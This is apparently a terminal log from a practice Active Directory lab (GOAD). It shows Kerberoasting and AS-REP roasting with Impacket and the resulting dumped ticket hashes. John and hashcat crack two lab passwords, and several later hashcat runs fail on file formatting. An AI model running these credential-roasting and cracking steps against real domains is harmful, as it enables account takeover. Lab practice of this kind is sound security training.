                                                                                                                                          
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ GetUserSPNs.py north.sevenkingdoms.local/hodor:hodor \-dc-ip 192.168.20.11 \-outputfile kerberoast.txt  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation    
\---------------------------------------------------  \-----------  \----------------------------------------------------------  \--------------------------  \--------------------------  \-----------  
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2025-04-13 18:44:32.702102  \<never\>                                   
CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-04-13 18:45:11.138577  \<never\>                     constrained   
HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-04-13 18:45:11.138577  \<never\>                     constrained   
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql\_svc                                                                  2025-04-13 18:45:36.012934  2025-04-13 19:12:10.107555                
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql\_svc                                                                  2025-04-13 18:45:36.012934  2025-04-13 19:12:10.107555              

\[-\] CCache file is not found. Skipping...  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nano kerberoast.txt                                                                                                            
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ls  
asrep\_hashes.txt  fast\_tcp\_scan.gnmap  kerberoast.txt      nuclei\_ai\_ad.txt      nuclei\_iis\_scan.txt  user.txt  
Certipy           fast\_tcp\_scan.nmap   naabu\_ad\_ports.txt  nuclei\_ai\_mssql.txt   targets.txt  
certipy-env       fast\_tcp\_scan.xml    nuclei\_ad\_scan.txt  nuclei\_core\_high.txt  users.txt  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cat asrep\_hashes.txt       
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b87ef1ed6b46bde443fcfa9154869ed$5cf0cd0a25673b7cbae92ea35ab90ef866e5acd9829f3737fc258a12f9f82889bbb4e1fac17b509d41e2f1696df1c6c1f42edf1181705293fbf8920312c8dda7fabf6d66e20be9e90c73441fb69f0224d34a3cc5315f83a58b796449e2207b229d3015350efcf5b1f1da509beb16fe669ed624f03c63baa234b7e290816e0112f56123c0ab4f994782cf950b925c411b3f48b5765848c2292a3382893525527ba66f82c199ecdcad26f51c1d4d3071473bb4855da192c28b1b3c3d4dff323486a236669c699f057e7aa63c3503b4e26b8f197b83eefe367b76edeb876ff7cdc9143e6a38460a7fdc1b2614c78eb81f83186308e3c4b5e1facc05c8bc405c13e5e1e7a2a86bc8  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nano kerberoast.txt   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ john \--wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt                                                                
Using default input encoding: UTF-8  
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 \[MD4 HMAC-MD5 RC4\])  
Will run 6 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
iknownothing     (?)       
1g 0:00:00:14 DONE (2025-08-26 13:59) 0.07067g/s 1013Kp/s 2552Kc/s 2552KC/s \!\!12Honey..\*7¡Vamos\!  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ john \--wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt \--show  
Invalid options combination: "--show"  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cat kerberoast.txt                                                      
$krb5tgs$23$\*sansa.stark$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sansa.stark\*$bb14c26f365057a0eb91c3baaa2a2ce7$7877c96c346a8118e6040beef4be6a7fc818fbd755e7138cffa441899a91451b88f3f625e6b29dcf61c190e7fd2357ac446a4dafc0909f90aa8a31a28cd27e018d96c4f2cb762f785ce5a4eea22ca79f1e6e4d508c672852798d6c92f067cda0a1a0d25cc823a4fe1079fb2a7f43afe424372b1961f187498860e60be5cffcdd34fa9265f8e6bd6eb599fd4837c3707b8314afb89cfdff0bacfa11213a33638459c1b12b5605fccab7f9a98146e639a8d7eafd295a3c3be2f5262496d8dd4aaeb92f9c716687618d4c2340700700b86498c538a40178ffb4b9384ee7cedf55fcda386413c451362ab76f6356faccd26a978784b81c44bd33bc7cd3b35a1076d2c72f0ddeda11c545350720b0f439fece780ff6aef175787b1dbe28d208d601aea88905398e6993a7e0613cce5aef00cfe9300d81b6a532b509aa65451a99c43564fbec0d59e50cd7d62f6de93775981eb8ffd0e08e7551c8dfcb006a3e56d2ec6d8ab046f6cdd26b15380c56abad65c1cb9907366acaa5ceae12f8ce1a8bbc76d19da57a76ca480bb26124e39eb79e99940de1129e1e0ced5882781525015012c45668ad5c96881f80226ed8129cf0d00969956fa6080642092f1138a9ea96820bd2536ff7206268581d10e6e71329e23f226f32fd754e08512f6643d5ac9fcb64af277828ceaca48c2a453c83dd4344a2962cbbddca557588e9f805b86e66141432f29ecd9618e175a7df1d9bff69aad2bdf38c55cc80c30235bfae8c5e285bce6dadafb840d9b9496f7f701b2f158854be014a7c31e875b0fa365fc7288fce38a0f9437f93949608b764d883c0ee781665b278616d03bc8da43317ce6e0b75cf95d8c6d7906cc9f1212836f998791ab4ec22b0d7a967d44b7252c62f9b7f3f663320be7e1cd1eb436d37f1e19da383994904ff86ace4f06fd9552f2760373c4e82a5ad39b218cac8f936d2c5f0a790f3304646bdb0327fffc5f453c0db0aefd403f84f5f6942f8145d9da3b04f96854daaf153337ab141ec7e8f7f868c11502869f17c775386ad6126b9f4ecb5211ce168262a48e2c2d712906b6fc6a0f700dcada1211d7fa6748327a3c9847feb78374801d32d77f9fe57b1b07cf4ad8faa948c107ccd9056850706f75632935728eff6ef667391e0f8884537796f8c265bae6497bdbe5ea1fea96113d04858ceced6c8eecfd319c9ce05968deebaae961d48f7801d0a7c4a04bcf96ba9791ead8aecb33386cf9ecbbd9ae161242c991e3278dcdecd431e40df0fa0c0443682686a2ba025c162894737af96d3b63ceabbece013ff6d39e2ff986ee510e542554ff01d0745ad1fcd89d548cd42751117b3417577dbfbc1f79f7dae69fef37e1e78c3266f6ea944db3c  
$krb5tgs$23$\*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow\*$9b28f8277ca435e082150d1a007eee15$6cdc846db2c447f440476aff78f68c999657f00bcbc70136c5118221f506bcef89ba43130a9cc757368c03b889f42873350046d27f9a13a282def9388a7cdb5a20b1193789548b28aa5ef546fe67480c0a35b8ff64bcf82b7b1f51ba32ad6f0d55c7657137d8b70bd7ccd2ce1a6678fcdf85794b466883773435709d1f75a68919e79bbdbeb49f87fd144a9edf729ee8305a253273f5a0a51de09cc97fc26140334c358267b863c07d7aa8b1a9a6f3d914642ee0c0991529abedc6ee65459eee3124edfd6ad9e11d3d050d9b7f4888e0dc2bb56560974f17a227b65cd14ee30e444c05fcb18a485adc28bb4b6fa667767ed5dc35a8c1cd68a01ca73fd681d7639c10c6449ef5cc06c642f4ca2bd2fd7bd4e7de6db15329307db6bfb44c81a548c142f46adf80a74c9186342ebfd1cb221326c92157d43e41941a3605e428eb822faf9fafaaf8d90bb26af1b751e3fe0a328d3c8078098268d03a95e0b970f344ee55e6b495a82584c023abe71212210dd0dce3e1afbfc6bb155ef4daf398858e9dab25776a6b28c250b716ea416c3ca2600d893e1c418c0af702b6efc03fc612ef4c734a7224ab84172ff34529671c92a28d5af16deed84ce0b3025f122d22dafb5f21646caa63ce2e28de78a1cabec8deaf52708ab95e9dcdc27de0acea001d5c29dddea21bcd49d1b370b639254dee965b26438203202c0b58720c7e6cfc7b0755af16927e3acba0b7e764eea780933e819763f363bfdb61dfd9082bc191f7b22c63995a59899fbeda3cb118acc4968bb8cb12295833b1ea9975a8df1b142f18ed99d64ea9f2488d5ea5ccbe2c4cc2b1554545e9ca89af980c419af130bc878e35259dfc048ba2ac6828dd1a83a86a59481c23d39a271fbd572ca381a31745c4fe6a6e711a9a01adc5ac8cb1a5ad4112f5eae01835685b32becc70b6f0786475913c73e18f70846619516ccde74e6b39f50e1b67029fa7ed7a28cf63c75eaa228d6a9c3b52f2ab3f8df837146e0d69d00ab65d8af366719f0735cf95731ac51914c76c8f36961abc58bb3b765000d7801c0e8f3b6d76443c7faab5fa40e3dc8d729c559378ba5fba57e694f59d82b56ecb63a8bc70e83b0958c77160e70552d3d8b5582808a87684e6baa709771d2863bad72560a305a37f21b6cc4ee645ae7b086f49850229f8ba61f5db66734bc751a75fa0ea02db03cba230d945135bc75bef917b01413bae5fdb05d2aedb0ea228bcc3efa80b258e0f8e6950e2123d3008807644f6f5be5ad27a2d698d3bfa65e023e2e48ff96c3b117411de41aa0289bbdf82b5f1af6d948573c0eb93157924e3f614a17f98a71ccbddbadef9b0ab8f92784c96bede11b6523f19cbc22ea56c2cd06d9e192613  
$krb5tgs$23$\*sql\_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql\_svc\*$8703840e010c05cf9bd1750dee78efd0$da1ea1fb56f37c070123ceb5ef30680de2ddb4251d7eba5f503c8c9fdd636cd0e9418d8d65ba83f6ed62398ec5fad0f53b83b1308341b8f61af6e8a1d018612225658ec824ccaf3e481d930d6baf2cb2332d89bbdd29446e2e082b8f8443e4ea3cbea79060dd13c11415c3a62e5550af944eb5ef7bdda3a68e67471612cd328f6e828268c5ed093e668b69e4b20388d7e2b1fd390208d637bf6e381c2e9ac033b683b2b9332760360069453eb2a004d4868d3808364d6f01bb1be817bdbf48a061fd272fc5e6c33585e29643aadf008818e2c03fd98e98c5fe23676b721d1f5eb451bd5fc38cb87385e75d7380dd1843e40b23ae3118c028d3d7877d1ecf67d62091f4cf3f030c0b3b482ccdb868c9b25d0f0bc82c24994e616c6fc1c2851881201c92f531b2485beb6ea5af45daf6dfe36712942d3b9f17a93c73e969ee627947a4085cf2d571fdd0af9b624729efdf0105da38a68267baf2b581a8013a97228b26937b7e0b3230ee4ada824d95fd42aef3c3121fa061d920314859d1db23d192de47290bceea72480b9d9562af0cb7ef247ba0ba79f2146fa3b74f344710f5d09ab67d2b9a077fa319663ce65e0431e1e7e14b24365141c8699f6c1b931cc398d9402616eb3a48fae2d4bd4119aa91a7eccef6d22a26bf4a8e0f7890eb7d8824f809eb0b34c58fa5c5bb73e6dd723a42998419b475153b8e0ca50ea8f2e79ee60a7addb69e70d51c3562387b587548cff8da8d9cb24ce6924d867092263523e444e376f2155cfbc4e4ac0f265ff6be867a7c589968d7a94a7cc2be3cd7622e09ac1cbf1059e0de3f3bdefad2e08bbbd3e26d5b19fb4a228b600e217183f35a4e32ac3dfc5a3bcf1d47305768342c88ba081847cd209e7065f9b8160ee3d27df2477d447daa2f23a9b81339da4222182da6537885f7b32fd79a741816fc117c1c48e8f0314c7a6788734da13606a3ce05cca22b211f8a64931bddf3647c0886aa91e07587735244664df81fe4adc4c8f6a1486e907c023c219989d871f75fd1c1e9dd21cd9dbc0bda279fcfb6a3ac6f845dc77e75e8ad12cfa7438b61c5406c03077327628b985515473a6b13b00ef522a0616008b4354b4ee2ac6ff338d9a1e66c19a3f44c18e29f85c78e3c4b7189acd95598bea86c9a45ad439e3cd45edde9fbce9c07fff43e02c839f39b085e5ea469233bc72f1b571a50d88cfa505ef9138245d42bdbbbbe4d53b07376acba3601aa756508c29a4ee3ee7e4efd78a263e61bd7382b6396f09176b6341c43aa1a0b47c83457975de0f927bdd9578d77ec7855863c5b82939e528228768d010207c057fb369f4fa1cbed979b1ea685d08e29c37668f0ca0b225dd8760715157874daa9ed955c5b50  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ls  
asrep\_hashes.txt  fast\_tcp\_scan.gnmap  kerberoast.txt      nuclei\_ai\_ad.txt      nuclei\_iis\_scan.txt  user.txt  
Certipy           fast\_tcp\_scan.nmap   naabu\_ad\_ports.txt  nuclei\_ai\_mssql.txt   targets.txt  
certipy-env       fast\_tcp\_scan.xml    nuclei\_ad\_scan.txt  nuclei\_core\_high.txt  users.txt  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cat asrep\_hashes.txt   
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b87ef1ed6b46bde443fcfa9154869ed$5cf0cd0a25673b7cbae92ea35ab90ef866e5acd9829f3737fc258a12f9f82889bbb4e1fac17b509d41e2f1696df1c6c1f42edf1181705293fbf8920312c8dda7fabf6d66e20be9e90c73441fb69f0224d34a3cc5315f83a58b796449e2207b229d3015350efcf5b1f1da509beb16fe669ed624f03c63baa234b7e290816e0112f56123c0ab4f994782cf950b925c411b3f48b5765848c2292a3382893525527ba66f82c199ecdcad26f51c1d4d3071473bb4855da192c28b1b3c3d4dff323486a236669c699f057e7aa63c3503b4e26b8f197b83eefe367b76edeb876ff7cdc9143e6a38460a7fdc1b2614c78eb81f83186308e3c4b5e1facc05c8bc405c13e5e1e7a2a86bc8  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ hashcat \-m 18200 \-a 0 asrep\_hashes.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL\_DEBUG) \- Platform \#1 \[The pocl project\]  
\====================================================================================================================================================  
\* Device \#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2201/4466 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1

Optimizers applied:  
\* Zero-Byte  
\* Not-Iterated  
\* Single-Hash  
\* Single-Salt

ATTENTION\! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append \-O to your commandline.  
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device \#1. Please be patient...  
Host memory required for this attack: 1 MB

Dictionary cache hit:  
\* Filename..: /usr/share/wordlists/rockyou.txt  
\* Passwords.: 14344385  
\* Bytes.....: 139921507  
\* Keyspace..: 14344385

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b87ef1ed6b46bde443fcfa9154869ed$5cf0cd0a25673b7cbae92ea35ab90ef866e5acd9829f3737fc258a12f9f82889bbb4e1fac17b509d41e2f1696df1c6c1f42edf1181705293fbf8920312c8dda7fabf6d66e20be9e90c73441fb69f0224d34a3cc5315f83a58b796449e2207b229d3015350efcf5b1f1da509beb16fe669ed624f03c63baa234b7e290816e0112f56123c0ab4f994782cf950b925c411b3f48b5765848c2292a3382893525527ba66f82c199ecdcad26f51c1d4d3071473bb4855da192c28b1b3c3d4dff323486a236669c699f057e7aa63c3503b4e26b8f197b83eefe367b76edeb876ff7cdc9143e6a38460a7fdc1b2614c78eb81f83186308e3c4b5e1facc05c8bc405c13e5e1e7a2a86bc8:iseedeadpeople  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...a86bc8  
Time.Started.....: Tue Aug 26 14:04:03 2025 (0 secs)  
Time.Estimated...: Tue Aug 26 14:04:03 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.\#1.........:   487.9 kH/s (1.20ms) @ Accel:512 Loops:1 Thr:1 Vec:16  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 55296/14344385 (0.39%)  
Rejected.........: 0/55296 (0.00%)  
Restore.Point....: 52224/14344385 (0.36%)  
Restore.Sub.\#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.\#1....: lileth \-\> grad2010  
Hardware.Mon.\#1..: Util: 18%

Started: Tue Aug 26 14:03:24 2025  
Stopped: Tue Aug 26 14:04:04 2025  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ls                                                                 
asrep\_hashes.txt  fast\_tcp\_scan.gnmap  kerberoast.txt      nuclei\_ai\_ad.txt      nuclei\_iis\_scan.txt  user.txt  
Certipy           fast\_tcp\_scan.nmap   naabu\_ad\_ports.txt  nuclei\_ai\_mssql.txt   targets.txt  
certipy-env       fast\_tcp\_scan.xml    nuclei\_ad\_scan.txt  nuclei\_core\_high.txt  users.txt  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cat kerberoast.txt    
$krb5tgs$23$\*sansa.stark$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sansa.stark\*$bb14c26f365057a0eb91c3baaa2a2ce7$7877c96c346a8118e6040beef4be6a7fc818fbd755e7138cffa441899a91451b88f3f625e6b29dcf61c190e7fd2357ac446a4dafc0909f90aa8a31a28cd27e018d96c4f2cb762f785ce5a4eea22ca79f1e6e4d508c672852798d6c92f067cda0a1a0d25cc823a4fe1079fb2a7f43afe424372b1961f187498860e60be5cffcdd34fa9265f8e6bd6eb599fd4837c3707b8314afb89cfdff0bacfa11213a33638459c1b12b5605fccab7f9a98146e639a8d7eafd295a3c3be2f5262496d8dd4aaeb92f9c716687618d4c2340700700b86498c538a40178ffb4b9384ee7cedf55fcda386413c451362ab76f6356faccd26a978784b81c44bd33bc7cd3b35a1076d2c72f0ddeda11c545350720b0f439fece780ff6aef175787b1dbe28d208d601aea88905398e6993a7e0613cce5aef00cfe9300d81b6a532b509aa65451a99c43564fbec0d59e50cd7d62f6de93775981eb8ffd0e08e7551c8dfcb006a3e56d2ec6d8ab046f6cdd26b15380c56abad65c1cb9907366acaa5ceae12f8ce1a8bbc76d19da57a76ca480bb26124e39eb79e99940de1129e1e0ced5882781525015012c45668ad5c96881f80226ed8129cf0d00969956fa6080642092f1138a9ea96820bd2536ff7206268581d10e6e71329e23f226f32fd754e08512f6643d5ac9fcb64af277828ceaca48c2a453c83dd4344a2962cbbddca557588e9f805b86e66141432f29ecd9618e175a7df1d9bff69aad2bdf38c55cc80c30235bfae8c5e285bce6dadafb840d9b9496f7f701b2f158854be014a7c31e875b0fa365fc7288fce38a0f9437f93949608b764d883c0ee781665b278616d03bc8da43317ce6e0b75cf95d8c6d7906cc9f1212836f998791ab4ec22b0d7a967d44b7252c62f9b7f3f663320be7e1cd1eb436d37f1e19da383994904ff86ace4f06fd9552f2760373c4e82a5ad39b218cac8f936d2c5f0a790f3304646bdb0327fffc5f453c0db0aefd403f84f5f6942f8145d9da3b04f96854daaf153337ab141ec7e8f7f868c11502869f17c775386ad6126b9f4ecb5211ce168262a48e2c2d712906b6fc6a0f700dcada1211d7fa6748327a3c9847feb78374801d32d77f9fe57b1b07cf4ad8faa948c107ccd9056850706f75632935728eff6ef667391e0f8884537796f8c265bae6497bdbe5ea1fea96113d04858ceced6c8eecfd319c9ce05968deebaae961d48f7801d0a7c4a04bcf96ba9791ead8aecb33386cf9ecbbd9ae161242c991e3278dcdecd431e40df0fa0c0443682686a2ba025c162894737af96d3b63ceabbece013ff6d39e2ff986ee510e542554ff01d0745ad1fcd89d548cd42751117b3417577dbfbc1f79f7dae69fef37e1e78c3266f6ea944db3c  
$krb5tgs$23$\*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow\*$9b28f8277ca435e082150d1a007eee15$6cdc846db2c447f440476aff78f68c999657f00bcbc70136c5118221f506bcef89ba43130a9cc757368c03b889f42873350046d27f9a13a282def9388a7cdb5a20b1193789548b28aa5ef546fe67480c0a35b8ff64bcf82b7b1f51ba32ad6f0d55c7657137d8b70bd7ccd2ce1a6678fcdf85794b466883773435709d1f75a68919e79bbdbeb49f87fd144a9edf729ee8305a253273f5a0a51de09cc97fc26140334c358267b863c07d7aa8b1a9a6f3d914642ee0c0991529abedc6ee65459eee3124edfd6ad9e11d3d050d9b7f4888e0dc2bb56560974f17a227b65cd14ee30e444c05fcb18a485adc28bb4b6fa667767ed5dc35a8c1cd68a01ca73fd681d7639c10c6449ef5cc06c642f4ca2bd2fd7bd4e7de6db15329307db6bfb44c81a548c142f46adf80a74c9186342ebfd1cb221326c92157d43e41941a3605e428eb822faf9fafaaf8d90bb26af1b751e3fe0a328d3c8078098268d03a95e0b970f344ee55e6b495a82584c023abe71212210dd0dce3e1afbfc6bb155ef4daf398858e9dab25776a6b28c250b716ea416c3ca2600d893e1c418c0af702b6efc03fc612ef4c734a7224ab84172ff34529671c92a28d5af16deed84ce0b3025f122d22dafb5f21646caa63ce2e28de78a1cabec8deaf52708ab95e9dcdc27de0acea001d5c29dddea21bcd49d1b370b639254dee965b26438203202c0b58720c7e6cfc7b0755af16927e3acba0b7e764eea780933e819763f363bfdb61dfd9082bc191f7b22c63995a59899fbeda3cb118acc4968bb8cb12295833b1ea9975a8df1b142f18ed99d64ea9f2488d5ea5ccbe2c4cc2b1554545e9ca89af980c419af130bc878e35259dfc048ba2ac6828dd1a83a86a59481c23d39a271fbd572ca381a31745c4fe6a6e711a9a01adc5ac8cb1a5ad4112f5eae01835685b32becc70b6f0786475913c73e18f70846619516ccde74e6b39f50e1b67029fa7ed7a28cf63c75eaa228d6a9c3b52f2ab3f8df837146e0d69d00ab65d8af366719f0735cf95731ac51914c76c8f36961abc58bb3b765000d7801c0e8f3b6d76443c7faab5fa40e3dc8d729c559378ba5fba57e694f59d82b56ecb63a8bc70e83b0958c77160e70552d3d8b5582808a87684e6baa709771d2863bad72560a305a37f21b6cc4ee645ae7b086f49850229f8ba61f5db66734bc751a75fa0ea02db03cba230d945135bc75bef917b01413bae5fdb05d2aedb0ea228bcc3efa80b258e0f8e6950e2123d3008807644f6f5be5ad27a2d698d3bfa65e023e2e48ff96c3b117411de41aa0289bbdf82b5f1af6d948573c0eb93157924e3f614a17f98a71ccbddbadef9b0ab8f92784c96bede11b6523f19cbc22ea56c2cd06d9e192613  
$krb5tgs$23$\*sql\_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql\_svc\*$8703840e010c05cf9bd1750dee78efd0$da1ea1fb56f37c070123ceb5ef30680de2ddb4251d7eba5f503c8c9fdd636cd0e9418d8d65ba83f6ed62398ec5fad0f53b83b1308341b8f61af6e8a1d018612225658ec824ccaf3e481d930d6baf2cb2332d89bbdd29446e2e082b8f8443e4ea3cbea79060dd13c11415c3a62e5550af944eb5ef7bdda3a68e67471612cd328f6e828268c5ed093e668b69e4b20388d7e2b1fd390208d637bf6e381c2e9ac033b683b2b9332760360069453eb2a004d4868d3808364d6f01bb1be817bdbf48a061fd272fc5e6c33585e29643aadf008818e2c03fd98e98c5fe23676b721d1f5eb451bd5fc38cb87385e75d7380dd1843e40b23ae3118c028d3d7877d1ecf67d62091f4cf3f030c0b3b482ccdb868c9b25d0f0bc82c24994e616c6fc1c2851881201c92f531b2485beb6ea5af45daf6dfe36712942d3b9f17a93c73e969ee627947a4085cf2d571fdd0af9b624729efdf0105da38a68267baf2b581a8013a97228b26937b7e0b3230ee4ada824d95fd42aef3c3121fa061d920314859d1db23d192de47290bceea72480b9d9562af0cb7ef247ba0ba79f2146fa3b74f344710f5d09ab67d2b9a077fa319663ce65e0431e1e7e14b24365141c8699f6c1b931cc398d9402616eb3a48fae2d4bd4119aa91a7eccef6d22a26bf4a8e0f7890eb7d8824f809eb0b34c58fa5c5bb73e6dd723a42998419b475153b8e0ca50ea8f2e79ee60a7addb69e70d51c3562387b587548cff8da8d9cb24ce6924d867092263523e444e376f2155cfbc4e4ac0f265ff6be867a7c589968d7a94a7cc2be3cd7622e09ac1cbf1059e0de3f3bdefad2e08bbbd3e26d5b19fb4a228b600e217183f35a4e32ac3dfc5a3bcf1d47305768342c88ba081847cd209e7065f9b8160ee3d27df2477d447daa2f23a9b81339da4222182da6537885f7b32fd79a741816fc117c1c48e8f0314c7a6788734da13606a3ce05cca22b211f8a64931bddf3647c0886aa91e07587735244664df81fe4adc4c8f6a1486e907c023c219989d871f75fd1c1e9dd21cd9dbc0bda279fcfb6a3ac6f845dc77e75e8ad12cfa7438b61c5406c03077327628b985515473a6b13b00ef522a0616008b4354b4ee2ac6ff338d9a1e66c19a3f44c18e29f85c78e3c4b7189acd95598bea86c9a45ad439e3cd45edde9fbce9c07fff43e02c839f39b085e5ea469233bc72f1b571a50d88cfa505ef9138245d42bdbbbbe4d53b07376acba3601aa756508c29a4ee3ee7e4efd78a263e61bd7382b6396f09176b6341c43aa1a0b47c83457975de0f927bdd9578d77ec7855863c5b82939e528228768d010207c057fb369f4fa1cbed979b1ea685d08e29c37668f0ca0b225dd8760715157874daa9ed955c5b50  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ hashcat \-m 18200 \-a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL\_DEBUG) \- Platform \#1 \[The pocl project\]  
\====================================================================================================================================================  
\* Device \#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2201/4466 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

Hashfile 'kerberoast.txt' on line 1 ($krb5t...7dae69fef37e1e78c3266f6ea944db3c): Separator unmatched  
Hashfile 'kerberoast.txt' on line 2 ($krb5t...b6523f19cbc22ea56c2cd06d9e192613): Separator unmatched  
Hashfile 'kerberoast.txt' on line 3 ($krb5t...225dd8760715157874daa9ed955c5b50): Separator unmatched  
No hashes loaded.

Started: Tue Aug 26 14:06:23 2025  
Stopped: Tue Aug 26 14:06:24 2025  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nano kerberoast.txt                                                
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ hashcat \-m 18200 \-a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL\_DEBUG) \- Platform \#1 \[The pocl project\]  
\====================================================================================================================================================  
\* Device \#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2201/4466 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

Hashfile 'kerberoast.txt' on line 1 ($krb5t...7dae69fef37e1e78c3266f6ea944db3c): Separator unmatched  
Hashfile 'kerberoast.txt' on line 3 ($krb5t...b6523f19cbc22ea56c2cd06d9e192613): Separator unmatched  
Hashfile 'kerberoast.txt' on line 5 ($krb5t...225dd8760715157874daa9ed955c5b50): Separator unmatched  
No hashes loaded.

Started: Tue Aug 26 14:07:01 2025  
Stopped: Tue Aug 26 14:07:02 2025  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nano kerberoast.txt                                                    
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ hashcat \-m 18200 \-a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL\_DEBUG) \- Platform \#1 \[The pocl project\]  
\====================================================================================================================================================  
\* Device \#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2201/4466 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

Hashfile 'kerberoast.txt' on line 1 ($krb5t...dae69fef37e1e78c3266f6ea944db3c,): Separator unmatched  
Hashfile 'kerberoast.txt' on line 2 ($krb5t...6523f19cbc22ea56c2cd06d9e192613,): Separator unmatched  
Hashfile 'kerberoast.txt' on line 3 ($krb5t...225dd8760715157874daa9ed955c5b50): Separator unmatched  
No hashes loaded.

Started: Tue Aug 26 14:07:43 2025  
Stopped: Tue Aug 26 14:07:43 2025  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nano kerberoast.txt                                                    
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
